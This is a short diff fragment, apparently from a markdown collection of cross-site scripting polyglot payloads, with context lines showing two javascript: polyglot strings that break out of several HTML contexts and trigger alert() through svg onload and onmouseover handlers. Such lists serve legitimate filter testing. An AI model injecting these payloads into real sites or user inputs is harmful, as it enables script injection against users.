@@ -24,3 +24,5 @@ javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></st
 # by h1/ragnar
 javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//>'
 ```
+
+
